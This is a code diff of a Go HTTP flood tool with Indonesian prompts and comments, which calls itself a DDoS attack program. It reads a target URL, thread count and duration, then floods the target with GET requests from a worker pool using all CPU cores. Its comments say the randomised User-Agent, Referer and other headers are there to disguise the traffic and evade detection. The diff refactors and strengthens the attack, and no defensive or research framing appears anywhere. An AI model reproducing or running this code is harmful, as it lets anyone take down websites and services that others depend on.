@@ -1,14 +1,19 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"io"
+	"math/rand"
+	"net"
 	"net/http"
+	"runtime"
+	"strings"
 	"sync"
 	"time"
-	"math/rand"
 )
 
+// Header acak untuk menyamarkan lalu lintas
 var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -17,9 +22,61 @@ var userAgents = []string{
 	"Mozilla/5.0 (Android 10; Mobile; rv:68.0)",
 }
 
-// Fungsi untuk mendeteksi server web
+var transport = &http.Transport{
+	MaxIdleConns:        100,
+	IdleConnTimeout:     10 * time.Second,
+	DisableCompression:  true,
+}
+
+var client = &http.Client{
+	Transport: transport,
+	Timeout:   5 * time.Second,
+}
+
+func main() {
+	// Maksimalkan penggunaan CPU
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	var url string
+	var numThreads, attackDuration int
+
+	// Input pengguna
+	fmt.Print("Masukkan URL target: ")
+	fmt.Scanln(&url)
+	fmt.Print("Masukkan jumlah thread (1-1000): ")
+	fmt.Scanln(&numThreads)
+	fmt.Print("Masukkan durasi serangan dalam detik (1-3600): ")
+	fmt.Scanln(&attackDuration)
+
+	// Deteksi jenis server
+	serverType := detectWebServer(url)
+	if serverType == "Tidak Diketahui" {
+		fmt.Println("Jenis server tidak diketahui, tidak dapat melanjutkan.")
+		return
+	}
+
+	fmt.Printf("Memulai serangan DDoS ke %s dengan %d thread selama %d detik...\n", url, numThreads, attackDuration)
+
+	// Inisialisasi worker pool
+	var wg sync.WaitGroup
+	jobs := make(chan bool, numThreads)
+	endTime := time.Now().Add(time.Duration(attackDuration) * time.Second)
+
+	// Luncurkan worker pool
+	workerPool(url, numThreads, jobs, endTime, &wg)
+
+	// Isi pekerjaan untuk worker
+	for time.Now().Before(endTime) {
+		jobs <- true
+	}
+	close(jobs)
+	wg.Wait()
+
+	fmt.Println("Serangan selesai.")
+}
+
+// Fungsi deteksi server web
 func detectWebServer(url string) string {
-	client := &http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Head(url)
 	if err != nil {
 		fmt.Println("Error: Tidak dapat terhubung ke server")
@@ -36,51 +93,46 @@ func detectWebServer(url string) string {
 }
 
 // Fungsi untuk mengirim permintaan HTTP
-func sendRequest(url string, wg *sync.WaitGroup, endTime time.Time) {
-	defer wg.Done()
-	client := &http.Client{Timeout: 5 * time.Second}
+func sendRequest(url string) {
+	req, _ := http.NewRequest("GET", url, nil)
 
-	for time.Now().Before(endTime) {
-		req, _ := http.NewRequest("GET", url, nil)
-		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-		req.Header.Set("Connection", "keep-alive")
-
-		resp, err := client.Do(req)
-		if err != nil {
-			fmt.Printf("Request gagal: %v\n", err)
-			continue
-		}
-		io.Copy(io.Discard, resp.Body)
-		fmt.Printf("Status: %d\n", resp.StatusCode)
-		resp.Body.Close()
+	// Header acak untuk menghindari deteksi
+	headers := map[string]string{
+		"User-Agent":      userAgents[rand.Intn(len(userAgents))],
+		"Accept":          "text/html,application/xhtml+xml",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Referer":         "https://google.com",
+		"Connection":      "keep-alive",
 	}
-}
 
-func main() {
-	var url string
-	var numThreads, attackDuration int
+	// Atur header ke permintaan
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
 
-	fmt.Print("Masukkan URL target: ")
-	fmt.Scanln(&url)
-	fmt.Print("Masukkan jumlah thread (1-1000): ")
-	fmt.Scanln(&numThreads)
-	fmt.Print("Masukkan durasi serangan dalam detik (1-3600): ")
-	fmt.Scanln(&attackDuration)
-
-	serverType := detectWebServer(url)
-	if serverType == "Tidak Diketahui" {
-		fmt.Println("Jenis server tidak diketahui, tidak dapat melanjutkan.")
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("Request gagal: %v\n", err)
 		return
 	}
 
-	fmt.Printf("Memulai serangan DDoS ke %s dengan %d thread selama %d detik...\n", url, numThreads, attackDuration)
-	endTime := time.Now().Add(time.Duration(attackDuration) * time.Second)
-	var wg sync.WaitGroup
+	io.Copy(io.Discard, resp.Body)
+	fmt.Printf("Status: %d\n", resp.StatusCode)
+	resp.Body.Close()
+}
 
-	for i := 0; i < numThreads; i++ {
+// Fungsi untuk membuat worker pool
+func workerPool(url string, workers int, jobs chan bool, endTime time.Time, wg *sync.WaitGroup) {
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
-		go sendRequest(url, &wg, endTime)
+		go func() {
+			defer wg.Done()
+			for range jobs {
+				if time.Now().After(endTime) {
+					return
+				}
+				sendRequest(url)
+			}
+		}()
 	}
-	wg.Wait()
-	fmt.Println("Serangan selesai.")
 }
